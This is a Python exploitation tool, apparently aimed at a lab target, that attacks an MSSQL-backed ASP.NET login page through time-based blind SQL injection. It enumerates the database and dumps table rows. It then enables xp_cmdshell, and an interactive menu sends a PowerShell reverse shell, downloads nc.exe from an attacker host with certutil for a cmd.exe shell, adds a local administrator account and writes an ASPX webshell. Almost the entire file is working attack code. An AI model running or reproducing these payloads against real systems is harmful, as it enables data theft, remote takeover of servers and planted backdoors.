#!/usr/bin/env python3

import asyncio
import aiohttp
import time
import re

# =======================
# CONFIG
# =======================
URL = "http://192.168.103.121/login.aspx"
METHOD = "POST"
PARAM = "ctl00$ContentPlaceHolder1$UsernameTextBox"

DELAY = 3
TIMEOUT = 15

MAX_CONCURRENCY = 20
MAX_DB_LEN = 20
MAX_TABLES = 10
MAX_COLUMNS = 10
MAX_ROWS = 20

# =======================
# ASYNC CORE
# =======================
sem = asyncio.Semaphore(MAX_CONCURRENCY)

def mssql_payload(cond):
    return f"a@a.com';IF({cond}) WAITFOR DELAY '0:0:{DELAY}'--"

def mssql_exec(cmd):
    return f"a@a.com';EXEC({cmd})--"

async def send(session, payload, viewstate, viewstategenerator, eventvalidation):
    async with sem:
        start = time.perf_counter()
        data = {
            "__VIEWSTATE": viewstate,
            "__VIEWSTATEGENERATOR": viewstategenerator,
            "__EVENTVALIDATION": eventvalidation,
            PARAM: payload,
            "ctl00$ContentPlaceHolder1$PasswordTextBox": "test",
            "ctl00$ContentPlaceHolder1$LoginButton": "Login"
        }
        try:
            async with session.post(
                URL,
                data=data,
                timeout=TIMEOUT,
                ssl=False
            ):
                pass
        except asyncio.TimeoutError:
            return True

        return (time.perf_counter() - start) >= (DELAY - 0.5)

async def exec_cmd(session, cmd, vs, vsg, ev):
    """Execute a command via xp_cmdshell — fire and forget"""
    payload = f"a@a.com';EXEC xp_cmdshell '{cmd}'--"
    data = {
        "__VIEWSTATE": vs,
        "__VIEWSTATEGENERATOR": vsg,
        "__EVENTVALIDATION": ev,
        PARAM: payload,
        "ctl00$ContentPlaceHolder1$PasswordTextBox": "test",
        "ctl00$ContentPlaceHolder1$LoginButton": "Login"
    }
    try:
        async with session.post(URL, data=data, timeout=TIMEOUT, ssl=False):
            pass
        return True
    except Exception:
        return False

# =======================
# GET VIEWSTATE TOKENS
# =======================
async def get_tokens(session):
    print("[*] Fetching VIEWSTATE tokens...")
    async with session.get(URL, ssl=False) as resp:
        text = await resp.text()

    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', text)
    viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', text)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', text)

    vs = viewstate.group(1) if viewstate else ""
    vsg = viewstategenerator.group(1) if viewstategenerator else ""
    ev = eventvalidation.group(1) if eventvalidation else ""

    print(f"[+] Got tokens")
    return vs, vsg, ev

# =======================
# PHASE 1 - SQLi CHECK
# =======================
async def check_sqli(session, vs, vsg, ev):
    print("[*] Phase 1 - SQLi detection")
    return await send(session, mssql_payload("1=1"), vs, vsg, ev)

# =======================
# PHASE 2 - DB LENGTH
# =======================
async def get_db_length(session, vs, vsg, ev):
    print("\n[*] Phase 2 - Detect DB name length")
    for n in range(1, MAX_DB_LEN + 1):
        if await send(session, mssql_payload(f"LEN(DB_NAME())={n}"), vs, vsg, ev):
            print(f"\t[+] DB length = {n}")
            return n
    return None

# =======================
# PHASE 3 - DB NAME
# =======================
async def get_db_name(session, length, vs, vsg, ev):
    print("\n[*] Phase 3 - Extract DB name")
    name = ""
    for pos in range(1, length + 1):
        for c in range(32, 127):
            if await send(session, mssql_payload(
                f"ASCII(SUBSTRING(DB_NAME(),{pos},1))={c}"
            ), vs, vsg, ev):
                name += chr(c)
                print(f"    [+] {name}")
                break
    return name

# =======================
# PHASE 4 - TABLE COUNT
# =======================
async def get_table_count(session, db, vs, vsg, ev):
    print("\n[*] Phase 4 - Count tables")
    for n in range(1, MAX_TABLES + 1):
        if await send(session, mssql_payload(
            f"(SELECT COUNT(*) FROM information_schema.tables "
            f"WHERE table_catalog='{db}')={n}"
        ), vs, vsg, ev):
            print(f"[+] Tables = {n}")
            return n
    return 0

# =======================
# PHASE 5 - TABLE NAMES
# =======================
async def get_tables(session, db, count, vs, vsg, ev):
    print("\n[*] Phase 5 - Extract table names")
    tables = []
    for i in range(count):
        name = ""
        print(f"    [*] Table {i}")
        for pos in range(1, 30):
            found = False
            for c in range(32, 127):
                if await send(session, mssql_payload(
                    f"ASCII(SUBSTRING("
                    f"(SELECT TOP 1 table_name FROM "
                    f"(SELECT TOP {i+1} table_name FROM information_schema.tables "
                    f"WHERE table_catalog='{db}' ORDER BY table_name ASC) AS t "
                    f"ORDER BY table_name DESC),{pos},1))={c}"
                ), vs, vsg, ev):
                    name += chr(c)
                    print(f"        [+] {name}")
                    found = True
                    break
            if not found:
                break
        tables.append(name)
        print(f"    [+] Final table: {name}")
    return tables

# =======================
# PHASE 6 - COLUMN NAMES
# =======================
async def get_columns(session, table, vs, vsg, ev):
    print(f"\n[*] Phase 6 - Columns for {table}")
    cols = []

    count = 0
    for n in range(1, MAX_COLUMNS + 1):
        if await send(session, mssql_payload(
            f"(SELECT COUNT(*) FROM information_schema.columns "
            f"WHERE table_name='{table}')={n}"
        ), vs, vsg, ev):
            count = n
            print(f"\t[+] Column count = {n}")
            break

    for i in range(count):
        name = ""
        print(f"    [*] Column {i}")
        for pos in range(1, 30):
            found = False
            for c in range(32, 127):
                if await send(session, mssql_payload(
                    f"ASCII(SUBSTRING("
                    f"(SELECT TOP 1 column_name FROM "
                    f"(SELECT TOP {i+1} column_name FROM information_schema.columns "
                    f"WHERE table_name='{table}' ORDER BY column_name ASC) AS c "
                    f"ORDER BY column_name DESC),{pos},1))={c}"
                ), vs, vsg, ev):
                    name += chr(c)
                    print(f"        [+] {name}")
                    found = True
                    break
            if not found:
                break
        cols.append(name)
        print(f"    [+] Final column: {name}")
    return cols

# =======================
# PHASE 7 - DATA DUMP
# =======================
async def dump_data(session, table, columns, vs, vsg, ev):
    print(f"\n[*] Phase 7 - Dump data from [{table}]")

    rows = 0
    print(f"[*] Counting rows in {table}...")
    for n in range(1, MAX_ROWS + 1):
        exists_payload = (
            f"(SELECT COUNT(*) FROM ("
            f"SELECT TOP {n} 1 AS x FROM {table}"
            f") AS r)={n}"
        )
        if await send(session, mssql_payload(exists_payload), vs, vsg, ev):
            rows = n
            print(f"\t[+] At least {n} row(s) found...")
        else:
            break

    if rows == 0:
        print(f"\t[-] No rows found in {table}")
        return

    print(f"\t[+] Total rows = {rows}")

    for row in range(rows):
        print(f"\n    [*] Row {row + 1} of {rows}")
        row_data = {}
        for col in columns:
            value = ""
            print(f"        [*] Extracting column: {col}")

            length = 0
            for n in range(1, 200):
                len_payload = (
                    f"LEN(CONVERT(NVARCHAR(MAX),"
                    f"(SELECT TOP 1 {col} FROM ("
                    f"SELECT TOP {row+1} {col} FROM {table}"
                    f") AS sub)))={n}"
                )
                if await send(session, mssql_payload(len_payload), vs, vsg, ev):
                    length = n
                    break

            if length == 0:
                print(f"        [+] {col}: (empty or null)")
                row_data[col] = "(empty or null)"
                continue

            for pos in range(1, length + 1):
                for c in range(32, 127):
                    char_payload = (
                        f"ASCII(SUBSTRING(CONVERT(NVARCHAR(MAX),"
                        f"(SELECT TOP 1 {col} FROM ("
                        f"SELECT TOP {row+1} {col} FROM {table}"
                        f") AS sub)),{pos},1))={c}"
                    )
                    if await send(session, mssql_payload(char_payload), vs, vsg, ev):
                        value += chr(c)
                        print(f"            [+] {col}: {value}")
                        break

            print(f"        [+] Final -> {col}: {value}")
            row_data[col] = value

        print(f"\n    [+] Row {row + 1} summary:")
        for col, val in row_data.items():
            print(f"        {col}: {val}")

# =======================
# PHASE 8 - RCE via xp_cmdshell
# =======================
async def phase8_rce(session, vs, vsg, ev):
    print("\n" + "="*50)
    print("[*] PHASE 8 - RCE via xp_cmdshell")
    print("="*50)

    # Step 1 - Check if xp_cmdshell is enabled
    print("\n[*] Step 1 - Checking if xp_cmdshell is enabled...")
    xp_check = mssql_payload(
        "(SELECT COUNT(*) FROM sys.configurations "
        "WHERE name='xp_cmdshell' AND value_in_use=1)=1"
    )
    xp_enabled = await send(session, xp_check, vs, vsg, ev)

    if xp_enabled:
        print("\t[+] xp_cmdshell is already ENABLED!")
    else:
        print("\t[-] xp_cmdshell is DISABLED — attempting to enable...")

        # Step 2 - Enable show advanced options
        print("\n[*] Step 2 - Enabling show advanced options...")
        enable1 = f"a@a.com';EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
        await send(session, enable1, vs, vsg, ev)
        await asyncio.sleep(1)

        # Step 3 - Enable xp_cmdshell
        print("[*] Step 3 - Enabling xp_cmdshell...")
        enable2 = f"a@a.com';EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"
        await send(session, enable2, vs, vsg, ev)
        await asyncio.sleep(1)

        # Verify
        print("[*] Verifying xp_cmdshell is now enabled...")
        xp_enabled = await send(session, xp_check, vs, vsg, ev)

        if xp_enabled:
            print("\t[+] xp_cmdshell successfully ENABLED!")
        else:
            print("\t[-] Failed to enable xp_cmdshell")
            print("\t[-] Server may be patched or you lack SA privileges")
            print("\t[*] Trying alternative execution methods...")
            await try_alternative_exec(session, vs, vsg, ev)
            return

    # Step 4 - Verify command execution
    print("\n[*] Step 4 - Verifying command execution...")
    print("[*] Testing with: whoami")
    print("[!] Note: This is blind execution - no output returned")
    print("[!] Use reverse shell to get interactive access\n")

    # Step 5 - Interactive shell menu
    await xp_shell_menu(session, vs, vsg, ev)

# =======================
# ALTERNATIVE EXEC METHODS
# =======================
async def try_alternative_exec(session, vs, vsg, ev):
    print("\n[*] Trying alternative execution methods...")

    # Try sp_oacreate
    print("[*] Attempting OLE Automation (sp_OACreate)...")
    ole_payload = (
        "a@a.com';EXEC sp_configure 'Ole Automation Procedures',1;"
        "RECONFIGURE--"
    )
    await send(session, ole_payload, vs, vsg, ev)
    print("[*] OLE Automation enabled — use manually if needed")

    # Try CLR
    print("[*] Note: CLR execution requires additional setup")
    print("[*] Consider using sqlmap --os-shell for automated exploitation")

# =======================
# XP_CMDSHELL INTERACTIVE MENU
# =======================
async def xp_shell_menu(session, vs, vsg, ev):
    print("\n" + "="*50)
    print("[*] xp_cmdshell INTERACTIVE MENU")
    print("="*50)
    print("[!] IMPORTANT: Output is NOT returned (blind execution)")
    print("[!] Use option 2 or 3 to get a reverse shell\n")

    while True:
        print("\n[*] Options:")
        print("    [1] Execute single command (blind)")
        print("    [2] Get reverse shell via PowerShell")
        print("    [3] Get reverse shell via certutil + nc.exe")
        print("    [4] Add admin user")
        print("    [5] Write webshell")
        print("    [6] Custom raw payload")
        print("    [0] Exit")

        try:
            choice = input("\nSelect option: ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n\n[+] Interrupted. Exiting...")
            break

        if choice == "0":
            print("\n[+] Exiting RCE module. Happy hacking! 🎯")
            break

        elif choice == "1":
            try:
                cmd = input("Enter command: ").strip()
                if cmd:
                    print(f"[*] Executing: {cmd}")
                    payload = f"a@a.com';EXEC xp_cmdshell '{cmd}'--"
                    await send(session, payload, vs, vsg, ev)
                    print("[+] Command sent (blind — no output returned)")
                    print("[!] Use a listener or check target for effects")
            except (KeyboardInterrupt, EOFError):
                continue

        elif choice == "2":
            try:
                lhost = input("Enter your Kali IP (LHOST): ").strip()
                lport = input("Enter listener port (LPORT) [4444]: ").strip() or "4444"
                print(f"\n[*] Setting up PowerShell reverse shell to {lhost}:{lport}")
                print(f"[!] Start your listener: nc -lvnp {lport}")
                input("[*] Press Enter when listener is ready...")

                ps_cmd = (
                    f"powershell -nop -w hidden -e "
                    f"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBsAGgAbwBzAHQAfQAiACwAewBsAHAAbwByAHQAfQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
                ).replace("{lhost}", lhost).replace("{lport}", lport)

                # Use raw PowerShell one-liner instead of base64 to avoid encoding issues
                ps_oneliner = (
                    f"powershell -nop -w hidden -c \""
                    f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                    f"$s=$c.GetStream();"
                    f"[byte[]]$b=0..65535|%{{0}};"
                    f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
                    f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                    f"$r=(iex $d 2>&1|Out-String);"
                    f"$r2=$r+'PS '+(pwd).Path+'> ';"
                    f"$sb=([text.encoding]::ASCII).GetBytes($r2);"
                    f"$s.Write($sb,0,$sb.Length);$s.Flush()}};"
                    f"$c.Close()\""
                )

                # Escape single quotes for SQL
                ps_escaped = ps_oneliner.replace("'", "''")
                payload = f"a@a.com';EXEC xp_cmdshell '{ps_escaped}'--"
                await send(session, payload, vs, vsg, ev)
                print(f"[+] Reverse shell payload sent to {lhost}:{lport}")
                print("[*] Check your listener!")

            except (KeyboardInterrupt, EOFError):
                continue

        elif choice == "3":
            try:
                lhost = input("Enter your Kali IP (LHOST): ").strip()
                lport = input("Enter listener port (LPORT) [4444]: ").strip() or "4444"
                http_port = input("Enter your HTTP server port [80]: ").strip() or "80"

                print(f"\n[*] Step 1 - Start HTTP server on Kali:")
                print(f"    cd /usr/share/windows-resources/binaries")
                print(f"    python3 -m http.server {http_port}")
                print(f"\n[*] Step 2 - Start listener:")
                print(f"    nc -lvnp {lport}")
                input("\n[*] Press Enter when both are ready...")

                # Download nc.exe
                print("[*] Downloading nc.exe to target...")
                dl_payload = f"a@a.com';EXEC xp_cmdshell 'certutil -urlcache -f http://{lhost}:{http_port}/nc.exe C:\\Windows\\Temp\\nc.exe'--"
                await send(session, dl_payload, vs, vsg, ev)
                await asyncio.sleep(3)

                # Execute reverse shell
                print(f"[*] Executing reverse shell to {lhost}:{lport}...")
                shell_payload = f"a@a.com';EXEC xp_cmdshell 'C:\\Windows\\Temp\\nc.exe {lhost} {lport} -e cmd.exe'--"
                await send(session, shell_payload, vs, vsg, ev)
                print(f"[+] Payload sent! Check your listener on port {lport}")

            except (KeyboardInterrupt, EOFError):
                continue

        elif choice == "4":
            try:
                username = input("Enter new admin username: ").strip()
                password = input("Enter password: ").strip()
                print(f"\n[*] Adding user {username} to local admins...")

                add_user = f"a@a.com';EXEC xp_cmdshell 'net user {username} {password} /add'--"
                await send(session, add_user, vs, vsg, ev)
                await asyncio.sleep(1)

                add_admin = f"a@a.com';EXEC xp_cmdshell 'net localgroup administrators {username} /add'--"
                await send(session, add_admin, vs, vsg, ev)
                await asyncio.sleep(1)

                print(f"[+] Commands sent!")
                print(f"[*] Try: evil-winrm -i TARGET_IP -u {username} -p '{password}'")
                print(f"[*] Or:  xfreerdp /u:{username} /p:{password} /v:TARGET_IP /cert:ignore")

            except (KeyboardInterrupt, EOFError):
                continue

        elif choice == "5":
            try:
                webroot = input("Enter web root path [C:\\inetpub\\wwwroot]: ").strip() or "C:\\inetpub\\wwwroot"
                shell_name = input("Enter webshell filename [cmd.aspx]: ").strip() or "cmd.aspx"
                full_path = f"{webroot}\\{shell_name}"

                print(f"\n[*] Writing webshell to {full_path}...")

                # ASPX webshell
                aspx_shell = (
                    "<%@ Page Language=\"C#\" %>"
                    "<%@ Import Namespace=\"System.Diagnostics\" %>"
                    "<% string cmd=Request[\"cmd\"]; "
                    "Process p=new Process(); "
                    "p.StartInfo.FileName=\"cmd.exe\"; "
                    "p.StartInfo.Arguments=\"/c \"+cmd; "
                    "p.StartInfo.UseShellExecute=false; "
                    "p.StartInfo.RedirectStandardOutput=true; "
                    "p.Start(); "
                    "Response.Write(\"<pre>\"+p.StandardOutput.ReadToEnd()+\"</pre>\"); %>"
                )

                write_payload = f"a@a.com';EXEC xp_cmdshell 'echo {aspx_shell} > {full_path}'--"
                await send(session, write_payload, vs, vsg, ev)
                print(f"[+] Webshell write attempted!")
                print(f"[*] Try accessing: http://TARGET_IP/{shell_name}?cmd=whoami")

            except (KeyboardInterrupt, EOFError):
                continue

        elif choice == "6":
            try:
                print("[*] Enter raw SQL payload (after the semicolon):")
                print("[*] Example: EXEC xp_cmdshell 'whoami'")
                raw = input("Payload: ").strip()
                if raw:
                    payload = f"a@a.com';{raw}--"
                    await send(session, payload, vs, vsg, ev)
                    print("[+] Raw payload sent")

            except (KeyboardInterrupt, EOFError):
                continue

        else:
            print("[-] Invalid option")

# =======================
# INTERACTIVE TABLE DUMP
# =======================
async def interactive_dump(session, tables, vs, vsg, ev):
    print("\n" + "="*50)
    print("[*] INTERACTIVE DUMP MODE")
    print("="*50)

    while True:
        print(f"\n[*] Available tables:")
        for i, t in enumerate(tables):
            if t:
                print(f"    [{i}] {t}")

        print("\n[*] Options:")
        print("    Enter table name or number to dump")
        print("    Type 'all' to dump all tables")
        print("    Type 'rce' to jump to Phase 8 RCE")
        print("    Type 'exit' or 'quit' to exit")

        try:
            choice = input("\nSelect table to dump: ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n\n[+] Interrupted. Exiting...")
            break

        if choice.lower() in ['exit', 'quit', 'q']:
            print("\n[+] Exiting. Happy hacking! 🎯")
            break

        elif choice.lower() == 'rce':
            await phase8_rce(session, vs, vsg, ev)
            break

        elif choice.lower() == 'all':
            for table in tables:
                if not table:
                    continue
                cols = await get_columns(session, table, vs, vsg, ev)
                print(f"\n[+] Columns in {table}: {cols}")
                await dump_data(session, table, cols, vs, vsg, ev)

        elif choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(tables):
                table = tables[idx]
                if not table:
                    print("[-] Empty table name, skipping")
                    continue
                cols = await get_columns(session, table, vs, vsg, ev)
                print(f"\n[+] Columns in {table}: {cols}")
                await dump_data(session, table, cols, vs, vsg, ev)
            else:
                print(f"[-] Invalid index. Choose between 0 and {len(tables)-1}")

        elif choice in tables:
            cols = await get_columns(session, choice, vs, vsg, ev)
            print(f"\n[+] Columns in {choice}: {cols}")
            await dump_data(session, choice, cols, vs, vsg, ev)

        else:
            print(f"[-] Table '{choice}' not found. Try again.")
            continue

        print("\n" + "-"*50)
        try:
            cont = input("Dump another table? (y/n/rce): ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print("\n\n[+] Interrupted. Exiting...")
            break

        if cont == 'rce':
            await phase8_rce(session, vs, vsg, ev)
            break
        elif cont != 'y':
            print("\n[+] Exiting. Happy hacking! 🎯")
            break

# =======================
# MAIN
# =======================
async def main():
    print("="*50)
    print("  MSSQL Blind SQLi — Full Exploitation Tool")
    print("  Supports: Enum + Dump + RCE via xp_cmdshell")
    print("="*50)

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=TIMEOUT)
    ) as session:

        vs, vsg, ev = await get_tokens(session)

        if await check_sqli(session, vs, vsg, ev):
            print("\t[+] Vulnerable to SQLi")
        else:
            print("[-] Not vulnerable")
            return

        print("\n[*] What do you want to do?")
        print("    [1] Full enumeration + interactive dump")
        print("    [2] Skip to Phase 8 RCE directly")

        try:
            mode = input("\nSelect mode [1]: ").strip() or "1"
        except (KeyboardInterrupt, EOFError):
            return

        if mode == "2":
            await phase8_rce(session, vs, vsg, ev)
            return

        length = await get_db_length(session, vs, vsg, ev)
        if not length:
            print("[-] Could not determine DB length")
            return

        db = await get_db_name(session, length, vs, vsg, ev)
        print(f"\n[+] Database: {db}")

        tcount = await get_table_count(session, db, vs, vsg, ev)
        if not tcount:
            print("[-] No tables found")
            return

        tables = await get_tables(session, db, tcount, vs, vsg, ev)
        print(f"\n[+] Tables found: {tables}")

        await interactive_dump(session, tables, vs, vsg, ev)

if __name__ == "__main__":
    asyncio.run(main())
